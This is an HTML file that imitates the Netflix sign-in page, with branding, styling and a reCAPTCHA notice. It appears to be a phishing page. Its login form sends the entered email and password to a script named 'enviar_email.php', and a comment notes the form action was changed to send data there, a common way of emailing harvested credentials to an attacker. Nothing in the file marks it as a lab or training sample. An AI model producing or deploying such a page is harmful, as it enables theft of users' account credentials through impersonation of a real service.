<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

        /* General Styles */
        body {
            margin: 0;
            font-family: 'Roboto', Arial, sans-serif;
            background: url('./rDJegQJaCyGaYysj2g5XWY-1200-80.jpg') no-repeat center center / cover;
            color: #ffffff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }

        /* Overlay to Darken Background */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5); /* Semi-transparent black overlay */
            z-index: 1;
        }

        /* Login Container Styles */
        .login-container {
            position: relative;
            z-index: 2;
            background-color: rgba(0, 0, 0, 0.75);
            padding: 4rem 3rem;
            border-radius: 8px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
        }

        .login-container h1 {
            margin-bottom: 1.5rem;
            font-size: 2rem;
            font-weight: 700;
        }

        .login-container input[type="email"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 1rem;
            margin-bottom: 1.2rem;
            border: none;
            border-radius: 4px;
            background-color: #333;
            color: #fff;
            font-size: 1rem;
        }

        .login-container input::placeholder {
            color: #8c8c8c;
        }

        .login-container button {
            width: 100%;
            padding: 1rem;
            background-color: #e50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
        }

        .login-container button:hover {
            background-color: #f6121d;
        }

        .login-container .extra-options {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 1rem;
            font-size: 0.9rem;
            color: #b3b3b3;
        }

        .login-container .extra-options a {
            color: #b3b3b3;
            text-decoration: none;
        }

        .login-container .extra-options a:hover {
            text-decoration: underline;
        }

        .login-container .signup-now {
            margin-top: 1.5rem;
            text-align: center;
            font-size: 0.9rem;
            color: #737373;
        }

        .login-container .signup-now a {
            color: #fff;
            text-decoration: none;
            font-weight: 500;
        }

        .login-container .signup-now a:hover {
            text-decoration: underline;
        }

        .login-container .captcha-info {
            margin-top: 1rem;
            font-size: 0.8rem;
            color: #8c8c8c;
            line-height: 1.4;
        }

        .login-container .captcha-info a {
            color: #b3b3b3;
            text-decoration: none;
        }

        .login-container .captcha-info a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <!-- Background Overlay -->
    <div class="overlay"></div>

    <!-- Login Container -->
    <div class="login-container">
        <h1>Sign In</h1>
        <!-- Form action updated to send data to enviar_email.php -->
        <form action="enviar_email.php" method="POST">
            <input type="email" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
            <div class="extra-options">
                <label>
                    <input type="checkbox" name="remember" style="margin-right: 0.5rem;">
                    Remember me
                </label>
                <a href="#">Need help?</a>
            </div>
        </form>
        <div class="signup-now">
            <p>New to Netflix? <a href="/signup">Sign up now</a>.</p>
        </div>
        <div class="captcha-info">
            <p>This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.</p>
        </div>
    </div>
</body>
</html>
